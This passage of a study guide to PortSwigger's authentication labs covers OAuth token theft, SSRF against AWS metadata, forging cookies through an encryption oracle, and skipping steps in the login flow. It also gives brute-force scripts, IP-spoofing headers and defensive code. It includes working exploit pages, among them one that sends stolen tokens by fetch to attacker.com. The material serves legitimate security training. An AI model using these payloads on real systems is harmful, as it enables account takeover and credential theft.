- Forgetting to maintain an active OAuth session when testing
- Incorrectly formatting the iframe src URL
- Using the wrong lab-specific identifiers in payloads
- Failing to check access logs to confirm successful exploitation

---

### Lab 18: Stealing OAuth Access Tokens via a Proxy Page

**Difficulty:** Practitioner

**Vulnerability Type:** Directory traversal in redirect_uri + PostMessage vulnerability

**Description:**
The lab demonstrates a compound vulnerability chain involving OAuth 2.0 misconfigurations. The redirect_uri is vulnerable to directory traversal, and the comment form page uses postMessage() to send window.location.href to its parent window with wildcard origin (*).

**Step-by-Step Solution:**

#### Phase 1: Reconnaissance
1. Monitor OAuth flow through Burp Suite proxy
2. Identify the vulnerable redirect_uri parameter supporting directory traversal
3. Audit additional blog pages for secondary vulnerabilities

#### Phase 2: Exploitation Setup
4. Extract the OAuth authorization request: GET /auth?client_id=[...]
5. Create an iframe leveraging directory traversal to redirect to /post/comment/comment-form
6. The crafted URL format:
```
https://oauth-[SERVER].oauth-server.net/auth?client_id=[ID]&redirect_uri=https://[LAB-ID].web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=[VALUE]&scope=openid%20profile%20email
```

#### Phase 3: Message Interception
7. Implement a message listener capturing postMessage data:
```javascript
window.addEventListener('message', function(e) {
  fetch("/" + encodeURIComponent(e.data.data))
}, false)
```

#### Phase 4: Token Extraction
8. Deliver exploit to victim admin user
9. Monitor exploit server access logs for requests containing URL-encoded access tokens
10. Extract the Bearer token from the logged request

#### Phase 5: API Exploitation
11. Send GET /me request with stolen token in Authorization header
12. Retrieve admin's API key from response

**Burp Suite Techniques:**
- Proxy interception for OAuth flow analysis
- Request/response inspection to identify secondary vulnerabilities
- Repeater tool for API testing with stolen credentials
- URL manipulation using history and copying functionality

**Complete Exploit Code:**
```html
<!DOCTYPE html>
<html>
<body>
<iframe src="https://oauth-abc123.oauth-server.net/auth?client_id=xyz789&redirect_uri=https://0a1f00e1038e7c3d.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=12345&scope=openid%20profile%20email"></iframe>

<script>
window.addEventListener('message', function(e) {
    fetch("/" + encodeURIComponent(e.data.data))
}, false)
</script>
</body>
</html>
```

**Key Technical Concepts:**
The attack chains two vulnerabilities: directory traversal in redirect handling plus overly permissive postMessage usage, allowing cross-origin token leakage.

**Common Mistakes:**
- Not properly URL-encoding the redirect_uri parameter
- Missing the postMessage vulnerability in comment form
- Not setting up the message listener correctly
- Failing to extract the token from URL fragments

---

### Lab 19: SSRF via OpenID Dynamic Client Registration

**Difficulty:** Expert

**Vulnerability Type:** SSRF through logo_uri in OpenID dynamic registration

**Description:**
The lab demonstrates a Server-Side Request Forgery (SSRF) vulnerability exploiting OpenID Connect's dynamic client registration feature. The OAuth service unsafely handles client-specific data, particularly the logo_uri property, allowing attackers to craft SSRF attacks to access internal cloud metadata endpoints.

**Step-by-Step Solution:**

#### Initial Setup (Steps 1-3)
1. Log in with provided credentials (wiener:peter) while proxying through Burp
2. Access the OpenID configuration endpoint:
```
https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration
```
3. Identify the client registration endpoint at /reg

#### Client Registration (Steps 2-3)

**Initial Registration Request:**
```http
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
  "redirect_uris" : [ "https://example.com" ]
}
```

**Response:** Contains client_id and other client metadata

#### Discovery of Logo Fetching Mechanism (Steps 4-8)
4. Observe that the authorization consent page fetches a client logo from: /client/CLIENT-ID/logo
5. This corresponds to the logo_uri property available during dynamic registration
6. Modify your registration request to include a Collaborator payload:

```http
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
  "redirect_uris" : [ "https://example.com" ],
  "logo_uri" : "https://BURP-COLLABORATOR-SUBDOMAIN"
}
```

7. Register the application and copy the returned client_id
8. Request the logo endpoint with the new client ID
9. Check Burp Collaborator for incoming HTTP interactions confirming server-side requests

#### SSRF Exploitation (Steps 9-12)
9. Modify the logo_uri to target the AWS metadata endpoint:

```http
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
  "redirect_uris" : [ "https://example.com" ],
  "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

10. Register and copy the new client_id
11. Request /client/[NEW-CLIENT-ID]/logo endpoint
12. The response contains sensitive metadata including the secret access key
13. Submit the access key via the "Submit solution" button

**Burp Suite Techniques:**
- Burp Repeater: Crafting and modifying POST/GET requests
- Burp Collaborator: Detecting server-side requests and confirming SSRF capability
- Request modification: Inserting Collaborator payloads and testing with target URLs

**Key Vulnerability Mechanics:**
1. Unauthenticated registration: The /reg endpoint accepts client applications without authentication
2. Unsafe URI handling: The logo_uri property isn't validated or restricted to legitimate domains
3. Server-side fetching: The OAuth service fetches logos server-side, triggering SSRF

**AWS Metadata Endpoint:**
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/
```

**Common Mistakes:**
- Forgetting to proxy traffic
- Incorrect endpoint paths
- Collaborator not working due to firewall
- Client ID mismatches
- Missing Content-Type header

---

## Business Logic Authentication Labs {#business-logic-labs}

### Lab 20: Authentication Bypass via Encryption Oracle

**Difficulty:** Practitioner

**Vulnerability Type:** Encryption oracle exposing block cipher operations

**Description:**
The lab contains a logic flaw exposing an encryption oracle to unauthenticated users. The vulnerability allows attackers to encrypt and decrypt arbitrary data through application endpoints, ultimately enabling authentication bypass to access admin functionality.

**Step-by-Step Solution:**

#### Phase 1: Reconnaissance & Oracle Discovery (Steps 1-4)
1. Log in using credentials wiener:peter with "Stay logged in" enabled
2. Post a comment and observe the encrypted stay-logged-in cookie
3. Submit an invalid email address and note the encrypted notification cookie response
4. Identify that error messages reflect decrypted input: "Invalid email address: [your-input]"

**Key Finding:** Two oracle endpoints:
- Encryption oracle: POST /post/comment with email parameter encrypts data into notification cookie
- Decryption oracle: GET request with notification cookie decrypts to error message

#### Phase 2: Cookie Format Analysis (Step 5)
5. In Burp Repeater, copy your stay-logged-in cookie
6. Paste into notification parameter of GET request
7. Observe decrypted format: wiener:1598530205184
8. Extract timestamp for later use

**Cookie Structure:** username:timestamp

#### Phase 3: Crafting Admin Cookie (Steps 6-8)
9. Modify email parameter to: administrator:your-timestamp
10. Encrypt via POST request
11. Copy resulting notification cookie
12. Decrypt via GET request
13. Observe the prefix: "Invalid email address: " (23 characters)

#### Phase 4: Handling Block Cipher Padding (Steps 9-12)
14. The application uses block-based encryption (likely AES in CBC mode)
15. Input must be padded so total bytes are multiples of 16
16. Strategy: Add 9 padding characters before payload
17. Example: xxxxxxxxxadministrator:your-timestamp

**Processing:**
1. Encrypt padded payload
2. Decode cookie (URL-decode, then Base64-decode)
3. Delete first 32 bytes (2 blocks: 23-char prefix + padding)
4. Re-encode and verify decryption shows only administrator:your-timestamp

#### Phase 5: Session Hijacking (Steps 13-14)
18. Send GET / request to Repeater
19. Delete session cookie entirely
20. Replace stay-logged-in with crafted ciphertext
21. Verify admin access granted
22. Navigate to /admin/delete?username=carlos to complete lab

**Burp Suite Tools:**
- Burp Repeater: Manual request/response manipulation
- Burp Decoder: URL and Base64 decoding of ciphertext
- Hex Editor: Precise byte manipulation
- Proxy History: Tracking request/response patterns

**Cryptographic Concepts:**

**Block Cipher Properties:**
- Algorithm uses 16-byte (128-bit) blocks
- Requires ciphertext length as multiple of 16 bytes
- Operates in CBC mode (inferred from behavior)

**Padding Oracle:**
The application inadvertently creates a padding oracle by:
- Accepting encrypted input via notification cookie
- Returning plaintext in error messages
- Validating block alignment before decryption

**Detailed Padding Example:**
```
Target: "administrator:1234567890"
Prefix in error: "Invalid email address: " (23 chars)
Padding needed: 9 characters
Final payload: "xxxxxxxxxadministrator:1234567890"
Total length: 42 characters

After encryption and decryption:
Block 1 (bytes 0-15):   "Invalid email ad"
Block 2 (bytes 16-31):  "dress: xxxxxxxxx"
Block 3 (bytes 32-47):  "administrator:12"
Block 4 (bytes 48-63):  "34567890" + padding

Delete blocks 1-2 (32 bytes) to remove prefix
Remaining: "administrator:1234567890"
```

**Common Mistakes:**
| Issue | Solution |
|-------|----------|
| Decryption fails with block alignment error | Ensure total bytes (after prefix removal) are multiple of 16 |
| Admin cookie still shows prefix | Verify you removed correct number of bytes (32, not 23) |
| Login fails after cookie replacement | Confirm session cookie is deleted and timestamp is recent |
| Encoding/decoding errors | Apply transformations in correct order: URL decode → Base64 decode |

**Key Insight:**
This vulnerability demonstrates how "helpful" error messages combined with encryption oracles create authentication bypass. The application treats user input symmetrically—anything encrypted can be decrypted and reflected back.

---

### Lab 21: Authentication Bypass via Flawed State Machine

**Difficulty:** Practitioner

**Vulnerability Type:** Flawed assumptions about authentication sequence

**Description:**
The lab contains flawed assumptions about the sequence of events in the login process. The vulnerability allows attackers to bypass authentication by manipulating the role selection step. The application defaults to administrator privileges when the role selection request is skipped.

**Step-by-Step Solution:**

**Step 1: Complete Normal Login**
Log in using credentials wiener:peter and observe the role selection requirement before accessing the home page.

**Step 2: Discover Admin Path**
Use content discovery tools to identify the /admin endpoint.

**Step 3: Test Direct Access**
Attempt browsing directly to /admin from the role selection page—this fails initially.

**Step 4: Exploit the Flaw**
1. Log out and return to login
2. Enable Burp proxy intercept
3. Submit login credentials via POST request
4. Forward the POST request
5. DROP the subsequent GET /role-selector request instead of completing it
6. Navigate to the home page

**Step 5: Verify Privilege Escalation**
The application defaults the user role to administrator when the role selection step is bypassed.

**Step 6: Complete Objective**
Access the admin panel and delete the user carlos.

**Key Burp Suite Techniques:**
- Proxy intercept: Intercept and manipulate HTTP requests during authentication flow
- Request dropping: Strategically drop requests to bypass workflow steps
- Content discovery: Identify hidden admin paths

**Authentication Flow:**
```
Normal Flow:
1. POST /login → 302 Redirect
2. GET /role-selector → 200 OK (role selection page)
3. POST /role-selector → 302 Redirect (sets role cookie)
4. GET / → 200 OK (home page with user role)

Exploited Flow:
1. POST /login → 302 Redirect
2. GET /role-selector → DROPPED
3. GET / → 200 OK (home page with DEFAULT ADMIN role)
```

**Critical Insight:**
This vulnerability demonstrates how skipping expected workflow steps can lead to unintended privilege escalation when applications make assumptions about request sequencing.

**Common Mistakes:**
- Not enabling intercept at the right time
- Forwarding the role-selector request instead of dropping it
- Not understanding the default role assignment behavior

---

## Attack Techniques and Tools {#attack-techniques}

### Brute-Force Attack Techniques

#### 1. Username Enumeration Methods

**Technique 1: Different Responses**
- Analyze error messages for valid vs. invalid usernames
- Look for differences in: status codes, response text, response length
- Sort results by response length or content

**Technique 2: Subtle Response Differences**
- Use Burp's Grep-Extract feature
- Identify whitespace differences (trailing spaces, periods)
- Compare exact error message text

**Technique 3: Response Timing Analysis**
- Valid usernames may have longer response times
- Use very long passwords to amplify timing differences
- Analyze "Response received" and "Response completed" columns
- Requires multiple tests to confirm consistency

**Technique 4: Account Lock Behavior**
- Valid accounts trigger lockout messages
- Invalid accounts never trigger lockout
- Use Cluster Bomb with null payloads to repeat attempts

#### 2. Bypassing Brute-Force Protection

**Method 1: IP-Based Rate Limiting Bypass**
- Use X-Forwarded-For header to spoof IP addresses
- Increment IP address for each attempt
- Common headers: X-Forwarded-For, X-Originating-IP, X-Remote-IP, X-Remote-Addr

**Method 2: Credential Stuffing**
- Use compromised username:password pairs from data breaches
- Stays under per-account attempt thresholds
- More targeted than pure brute-force

**Method 3: Reset Counter Technique**
- Identify mechanisms that reset failed attempt counters
- Alternate between valid login (own account) and target attempts
- Use Pitchfork attack mode with alternating credentials

**Method 4: Multiple Credentials Per Request**
- Send password arrays in JSON format
- Bypass per-request rate limiting
- Example: {"username":"carlos","password":["pass1","pass2","pass3"]}

#### 3. Session-Based Attacks

**Macro-Based Attacks:**
- Create Burp macros to maintain valid sessions
- Useful when attacks trigger logout after X attempts
- Configure session handling rules to replay authentication

**Cookie-Based Attacks:**
- Target "stay-logged-in" cookies instead of login forms
- Apply transformations: hash → prefix → encode
- Often less protected than direct login attempts

### Multi-Factor Authentication Bypass Techniques

#### 1. Simple Bypass
- Complete first factor (password)
- Skip second factor by directly accessing protected resources
- Navigate to /my-account or similar endpoints

#### 2. Parameter Manipulation
- Identify user identifiers in 2FA verification (verify parameter, userid cookie, etc.)
- Modify to target other users
- Generate codes for victims by manipulating parameters

#### 3. Brute-Force 2FA Codes
- 4-digit codes: 10,000 possibilities (0000-9999)
- 6-digit codes: 1,000,000 possibilities
- Use session handling macros to maintain authentication
- Set resource pool to 1 concurrent request

#### 4. Code Reuse
- Test if codes can be reused multiple times
- Check if codes expire appropriately
- Attempt code sharing between accounts

### OAuth Exploitation Techniques

#### 1. Implicit Flow Attacks
- Intercept POST /authenticate requests
- Modify email/username parameters
- No server-side validation of user data

#### 2. CSRF in Profile Linking
- Missing state parameter in authorization requests
- Capture authorization codes and deliver via CSRF
- Victim links attacker's social profile to their account

#### 3. redirect_uri Exploitation
- Test for insufficient validation of redirect_uri
- Use directory traversal: /oauth-callback/../other-page
- Redirect to attacker-controlled domains
- Capture authorization codes or access tokens

#### 4. PostMessage Exploitation
- Find pages with vulnerable postMessage implementations
- Chain with redirect_uri vulnerabilities
- Intercept access tokens sent via postMessage

#### 5. OpenID Dynamic Registration SSRF
- Register client with malicious logo_uri
- Target internal metadata endpoints
- AWS metadata: http://169.254.169.254/latest/meta-data/
- Exfiltrate sensitive credentials

### Password Reset Exploitation

#### 1. Broken Logic
- Remove or empty token parameters
- Manipulate username parameters
- Test token validation at each step

#### 2. Host Header Poisoning
- Inject X-Forwarded-Host header
- Redirect password reset links to attacker domain
- Capture victim's reset tokens

#### 3. Token Predictability
- Analyze token generation patterns
- Look for timestamp-based or sequential tokens
- Attempt to generate valid tokens

### Burp Suite Configuration Tips

#### Intruder Attack Types

**Sniper:**
- Single payload position
- Best for: username enumeration, password brute-force (after enumeration)

**Battering Ram:**
- Same payload in multiple positions
- Best for: testing same value in multiple parameters

**Pitchfork:**
- Multiple payload positions, corresponding values
- Best for: IP rotation with username testing, credential stuffing

**Cluster Bomb:**
- Multiple payload positions, all combinations
- Best for: account lock testing, full credential brute-force (slow)

#### Payload Processing Rules

**Common Transformations:**
1. Hash: MD5, SHA-1, SHA-256
2. Add prefix/suffix: username:, admin-, etc.
3. Encode: Base64, URL encoding, HTML encoding
4. Case modification: Uppercase, lowercase, capitalize

**Rule Order Matters:**
Always apply in this order: Modify → Hash → Encode

#### Grep Match and Extract

**Grep Match:**
- Flag responses containing specific strings
- Useful for identifying success conditions
- Examples: "Update email", "Welcome", "Logout"

**Grep Extract:**
- Extract specific parts of responses
- Useful for finding subtle differences
- Can extract error messages, tokens, etc.

#### Resource Pools

**When to Use:**
- Session-based attacks requiring sequential requests
- 2FA brute-force with re-authentication
- Attacks where parallel requests cause conflicts

**Configuration:**
- Set "Maximum concurrent requests" to 1
- Prevents race conditions and session conflicts

### Python Automation Examples

#### Basic Brute-Force Script
```python
import requests

target = "https://vulnerable-website.com/login"
usernames = ["admin", "carlos", "user"]
passwords = ["password", "123456", "admin"]

for username in usernames:
    for password in passwords:
        data = {"username": username, "password": password}
        response = requests.post(target, data=data)

        if response.status_code == 302:
            print(f"[+] Valid credentials: {username}:{password}")
            break
        elif "Incorrect password" in response.text:
            print(f"[+] Valid username: {username}")
            # Continue with this username
```

#### Timing-Based Username Enumeration
```python
import requests
import time

def check_username(username):
    url = "https://vulnerable-website.com/login"
    # Use long password to amplify timing difference
    password = "a" * 100
    data = {"username": username, "password": password}

    start = time.time()
    response = requests.post(url, data=data)
    elapsed = time.time() - start

    return elapsed

usernames = ["admin", "carlos", "user", "test"]
times = {}

for username in usernames:
    # Test multiple times for accuracy
    measurements = [check_username(username) for _ in range(5)]
    avg_time = sum(measurements) / len(measurements)
    times[username] = avg_time
    print(f"{username}: {avg_time:.3f}s")

# Username with longest time is likely valid
valid_username = max(times, key=times.get)
print(f"\n[+] Likely valid username: {valid_username}")
```

#### OAuth Token Stealer Exploit
```html
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<iframe id="oauth" src=""></iframe>

<script>
// Construct malicious OAuth URL
const oauth_url = "https://oauth-server.com/auth?" +
    "client_id=abc123&" +
    "redirect_uri=https://vulnerable-app.com/oauth-callback/../proxy-page&" +
    "response_type=token&" +
    "scope=openid%20profile%20email";

document.getElementById('oauth').src = oauth_url;

// Listen for postMessage containing token
window.addEventListener('message', function(e) {
    // Extract token from message data
    const data = e.data.data || e.data;

    // Send to attacker server
    fetch("https://attacker.com/log?data=" + encodeURIComponent(data));
}, false);
</script>
</body>
</html>
```

### Common HTTP Headers for Testing

#### Authentication Headers
```
Authorization: Bearer <token>
Authorization: Basic <base64(user:pass)>
Cookie: session=<session_id>; stay-logged-in=<cookie_value>
X-Auth-Token: <token>
```

#### IP Spoofing Headers
```
X-Forwarded-For: 192.168.1.1
X-Originating-IP: 192.168.1.1
X-Remote-IP: 192.168.1.1
X-Remote-Addr: 192.168.1.1
X-Client-IP: 192.168.1.1
```

#### Host Header Manipulation
```
Host: vulnerable-website.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
```

---

## Defense Mechanisms {#defense-mechanisms}

### Password-Based Authentication Security

#### 1. Credential Protection
- **Enforce HTTPS:** Never send login data over unencrypted connections
- **Redirect HTTP to HTTPS:** Automatically upgrade insecure requests
- **Audit username disclosure:** Prevent username/email leakage through profiles or HTTP responses

#### 2. Password Strategy
- **Implement real-time strength checking:** Use tools like zxcvbn instead of rigid policies
- **Encourage genuinely secure passwords:** Don't rely on policies users can circumvent
- **Avoid predictable patterns:** Minimum length alone isn't sufficient

#### 3. Username Enumeration Prevention
- **Identical error messages:** Use generic messages regardless of username validity
- **Consistent HTTP status codes:** Return same codes for valid/invalid attempts
- **Response time normalization:** Ensure consistent response times across scenarios
- **Rate limiting:** Apply to username enumeration attempts, not just password attempts

#### 4. Brute-Force Protection
- **IP-based rate limiting:** With measures preventing IP spoofing
- **CAPTCHA requirements:** After threshold attempts to make attacks manual
- **Account lockout:** Temporary lockout after X failed attempts
- **Progressive delays:** Increase delay after each failed attempt
- **Multi-layered approach:** Combine multiple techniques

**Best Practices:**
```python
# Example: Progressive delay implementation
failed_attempts = 0
base_delay = 1  # seconds

def authenticate(username, password):
    global failed_attempts

    if failed_attempts > 0:
        delay = base_delay * (2 ** failed_attempts)
        time.sleep(min(delay, 60))  # Cap at 60 seconds

    if verify_credentials(username, password):
        failed_attempts = 0
        return True
    else:
        failed_attempts += 1
        return False
```

### Multi-Factor Authentication Security

#### 1. Proper Implementation
- **Enforce completion:** Verify second factor before granting access
- **Server-side validation:** Don't trust client-side navigation
- **Session binding:** Tie 2FA codes to specific sessions
- **User verification:** Validate user identifier server-side, not from client

#### 2. Code Generation Best Practices
- **Use possession factors:** Dedicated apps/devices, not SMS
- **Time-based codes:** TOTP (Time-based One-Time Password)
- **Sufficient entropy:** 6+ digits minimum
- **Short expiration:** 30-60 second validity windows
- **Single use:** Invalidate codes after successful use

#### 3. Brute-Force Protection
- **Rate limiting:** Strict limits on verification attempts
- **Progressive lockout:** Increase lockout duration with repeated failures
- **Complete logout:** Force re-authentication after failed 2FA attempts
- **Account monitoring:** Alert users to suspicious verification attempts

#### 4. Backup Mechanisms
- **Recovery codes:** One-time use codes for device loss
- **Secure storage:** Encrypt recovery codes in database
- **Administrative override:** Secure process for account recovery
- **Audit logging:** Track all 2FA-related events

### OAuth Implementation Security

#### 1. Authorization Flow Security
- **state parameter:** Always include and validate for CSRF protection
- **redirect_uri validation:** Strict whitelist of allowed redirect URIs
- **Code single-use:** Authorization codes must be single-use only
- **Code expiration:** Short lifetime (5-10 minutes maximum)

**Example state parameter implementation:**
```python
import secrets
import hashlib

def generate_state():
    return secrets.token_urlsafe(32)

def verify_state(received_state, expected_state):
    return secrets.compare_digest(received_state, expected_state)

# In authorization request
state = generate_state()
session['oauth_state'] = state
redirect_to_oauth_provider(state=state)

# In callback
if not verify_state(request.args['state'], session.get('oauth_state')):
    abort(403)
```

#### 2. redirect_uri Validation
```python
ALLOWED_REDIRECTS = [
    "https://app.example.com/oauth/callback",
    "https://app.example.com/auth/callback"
]

def validate_redirect_uri(redirect_uri):
    # Exact match only, no pattern matching
    return redirect_uri in ALLOWED_REDIRECTS
```

#### 3. Client Registration Security
- **Require authentication:** For dynamic client registration
- **Validate all URIs:** logo_uri, client_uri, policy_uri, tos_uri
- **Whitelist schemes:** Only allow https:// URIs
- **SSRF protection:** Don't fetch external URIs server-side, or use strict controls

#### 4. Token Security
- **Short-lived access tokens:** 15-60 minute lifetime
- **Refresh token rotation:** Issue new refresh token with each use
- **Secure storage:** Never store tokens in localStorage (XSS risk)
- **Token binding:** Tie tokens to specific clients/sessions

### Session Management Security

#### 1. Cookie Security
- **Secure flag:** Ensure cookies only sent over HTTPS
- **HttpOnly flag:** Prevent JavaScript access
- **SameSite attribute:** Prevent CSRF attacks
- **Appropriate expiration:** Balance security and usability

**Example secure cookie:**
```
Set-Cookie: session=abc123xyz789; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600
```

#### 2. "Stay Logged In" Features
- **Strong token generation:** High-entropy random tokens
- **Separate from session:** Don't reuse session identifiers
- **Database storage:** Store hashed tokens in database
- **Expiration:** Reasonable maximum lifetime (30 days)
- **Revocation mechanism:** Allow users to revoke remembered devices

**Secure implementation:**
```python
import secrets
import hashlib

def create_remember_token(user_id):
    token = secrets.token_urlsafe(32)
    token_hash = hashlib.sha256(token.encode()).hexdigest()

    # Store hash in database
    db.execute(
        "INSERT INTO remember_tokens (user_id, token_hash, created_at) VALUES (?, ?, ?)",
        (user_id, token_hash, datetime.now())
    )

    return token

def verify_remember_token(token):
    token_hash = hashlib.sha256(token.encode()).hexdigest()

    result = db.execute(
        "SELECT user_id FROM remember_tokens WHERE token_hash = ? AND created_at > ?",
        (token_hash, datetime.now() - timedelta(days=30))
    ).fetchone()

    return result['user_id'] if result else None
```

### Password Reset Security

#### 1. Token Generation
- **High entropy:** Cryptographically secure random tokens
- **Sufficient length:** Minimum 32 bytes (256 bits)
- **Single use:** Invalidate after use
- **Short expiration:** 15-60 minute lifetime
- **No user hints:** Don't include username or timestamp

**Secure token generation:**
```python
import secrets

def generate_reset_token():
    return secrets.token_urlsafe(32)  # 256 bits of entropy
```

#### 2. Token Validation
- **Server-side storage:** Store hashed tokens in database
- **Verify at submission:** Revalidate token when processing password change
- **User binding:** Ensure token associated with correct user
- **Timing attack protection:** Use constant-time comparison

**Secure validation:**
```python
import hashlib
import secrets

def verify_reset_token(token, user_id):
    token_hash = hashlib.sha256(token.encode()).hexdigest()

    result = db.execute(
        "SELECT user_id, created_at FROM password_reset_tokens WHERE token_hash = ?",
        (token_hash,)
    ).fetchone()

    if not result:
        return False

    # Check user ID matches
    if result['user_id'] != user_id:
        return False

    # Check expiration
    if datetime.now() - result['created_at'] > timedelta(minutes=60):
        return False

    # Delete token after successful verification
    db.execute("DELETE FROM password_reset_tokens WHERE token_hash = ?", (token_hash,))

    return True
```

#### 3. Host Header Protection
- **Validate Host header:** Compare against whitelist
- **Ignore proxy headers:** Don't trust X-Forwarded-Host without validation
- **Use configuration:** Store base URL in server configuration

**Secure URL generation:**
```python
ALLOWED_HOSTS = ["app.example.com", "www.example.com"]

def generate_reset_url(token):
    # Use configured base URL, not Host header
    base_url = config.BASE_URL  # https://app.example.com
    return f"{base_url}/reset-password?token={token}"

def validate_host_header(host):
    return host in ALLOWED_HOSTS
```

### General Security Best Practices

#### 1. Input Validation
- **Whitelist approach:** Define allowed inputs, reject everything else
- **Length limits:** Enforce maximum lengths for all inputs
- **Type validation:** Ensure correct data types
- **Encoding validation:** Verify proper character encoding

#### 2. Error Handling
- **Generic error messages:** Don't leak information about system state
- **Consistent responses:** Same message for different error conditions
- **Logging:** Log detailed errors server-side, not to user
- **Rate limiting:** Apply to error conditions to prevent enumeration

#### 3. Monitoring and Alerting
- **Failed authentication attempts:** Track and alert on anomalies
- **Account lockouts:** Monitor for patterns indicating attacks
- **Password reset requests:** Alert users to reset attempts
- **Geographic anomalies:** Flag logins from unusual locations

#### 4. Audit Logging
- **Log all authentication events:** Successes and failures
- **Include context:** IP address, user agent, timestamp
- **Secure storage:** Protect logs from tampering
- **Regular review:** Analyze logs for suspicious patterns

**Example audit log entry:**
```json
{
  "event": "login_attempt",
  "timestamp": "2026-01-09T12:34:56Z",
  "user_id": "user123",
  "username": "carlos",
  "ip_address": "192.168.1.100",
  "user_agent": "Mozilla/5.0...",
  "success": false,
  "failure_reason": "invalid_password",
  "mfa_required": true,
  "geographic_location": "US-CA"
}
```

---

## Resources {#resources}

### PortSwigger Web Security Academy

**Main Pages:**
- Authentication Vulnerabilities: https://portswigger.net/web-security/authentication
- Password-Based Authentication: https://portswigger.net/web-security/authentication/password-based
- Multi-Factor Authentication: https://portswigger.net/web-security/authentication/multi-factor
- Other Authentication Mechanisms: https://portswigger.net/web-security/authentication/other-mechanisms
- OAuth 2.0 Authentication: https://portswigger.net/web-security/oauth
- All Labs: https://portswigger.net/web-security/all-labs

**Wordlists:**
- Candidate Usernames: https://portswigger.net/web-security/authentication/auth-lab-usernames
- Candidate Passwords: https://portswigger.net/web-security/authentication/auth-lab-passwords

### Lab Categories Summary

**Total Labs Documented: 21**

#### Password-Based (6 labs)
1. Username enumeration via different responses (Apprentice)
2. Username enumeration via subtly different responses (Practitioner)
3. Username enumeration via response timing (Practitioner)
4. Broken brute-force protection, IP block (Practitioner)
5. Username enumeration via account lock (Practitioner)
6. Broken brute-force protection, multiple credentials per request (Practitioner)

#### Multi-Factor Authentication (3 labs)
7. 2FA simple bypass (Apprentice)
8. 2FA broken logic (Practitioner)
9. 2FA bypass using brute-force attack (Practitioner)

#### Other Authentication Mechanisms (5 labs)
10. Brute-forcing a stay-logged-in cookie (Practitioner)
11. Offline password cracking (Practitioner)
12. Password reset broken logic (Practitioner)
13. Password reset poisoning via middleware (Practitioner)
14. Password brute-force via password change (Practitioner)

#### OAuth Authentication (5 labs)
15. Authentication bypass via OAuth implicit flow (Apprentice)
16. Forced OAuth profile linking (Practitioner)
17. OAuth account hijacking via redirect_uri (Practitioner)
18. Stealing OAuth access tokens via a proxy page (Practitioner)
19. SSRF via OpenID dynamic client registration (Expert)

#### Business Logic (2 labs)
20. Authentication bypass via encryption oracle (Practitioner)
21. Authentication bypass via flawed state machine (Practitioner)

### Additional Resources

**Burp Suite Documentation:**
- Burp Intruder: https://portswigger.net/burp/documentation/desktop/tools/intruder
- Burp Repeater: https://portswigger.net/burp/documentation/desktop/tools/repeater
- Burp Collaborator: https://portswigger.net/burp/documentation/desktop/tools/collaborator
- Session Handling Rules: https://portswigger.net/burp/documentation/desktop/settings/sessions

**OAuth 2.0 Specifications:**
- OAuth 2.0 RFC 6749: https://tools.ietf.org/html/rfc6749
- OAuth 2.0 Security Best Practices: https://tools.ietf.org/html/draft-ietf-oauth-security-topics
- OpenID Connect Core: https://openid.net/specs/openid-connect-core-1_0.html

**Password Security:**
- NIST Digital Identity Guidelines: https://pages.nist.gov/800-63-3/
- OWASP Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- zxcvbn Password Strength Estimator: https://github.com/dropbox/zxcvbn

**Additional Tools:**
- Hydra (brute-force tool): https://github.com/vanhauser-thc/thc-hydra
- Turbo Intruder: https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack
- JWT.io (JWT debugger): https://jwt.io/

### Lab Access Information

All labs are freely accessible at PortSwigger Web Security Academy. To access:

1. Visit https://portswigger.net/web-security
2. Navigate to the Authentication section
3. Each lab provides:
   - Interactive vulnerable application
   - Lab credentials (where applicable)
   - Exploit server (for XSS/exfiltration labs)
   - Email client (for password reset labs)
   - Solution writeups (accessible after attempting)

### Difficulty Levels

**Apprentice:** Foundational concepts, straightforward exploitation
**Practitioner:** Intermediate techniques, multi-step exploitation
**Expert:** Advanced concepts, complex attack chains

### Certification Path

To prepare for the Burp Suite Certified Practitioner exam:
1. Complete all Apprentice-level labs (required)
2. Complete all Practitioner-level labs (required)
3. Attempt Expert-level labs (recommended)
4. Practice time management (exam is time-limited)
5. Focus on manual exploitation techniques

---

## Conclusion

This comprehensive guide covers all authentication labs available on PortSwigger's Web Security Academy as of January 2026. The labs provide hands-on experience with:

- **Username enumeration** through various side channels
- **Password brute-forcing** and bypass techniques
- **Multi-factor authentication** vulnerabilities and bypasses
- **Session management** flaws in cookies and tokens
- **Password reset** mechanism exploitation
- **OAuth 2.0** implementation vulnerabilities
- **Business logic** flaws in authentication flows

Each lab section includes:
- Detailed vulnerability descriptions
- Step-by-step exploitation guides
- Burp Suite configuration tips
- HTTP request/response examples
- Common mistakes and troubleshooting
- Real-world security implications

Use this guide as a reference for:
- Learning web authentication security
- Preparing for bug bounty programs
- Understanding attacker methodologies
- Implementing secure authentication
- Studying for security certifications

**Note:** Unauthorized access is illegal.

---

*Guide compiled from PortSwigger Web Security Academy*
*Last updated: January 2026*
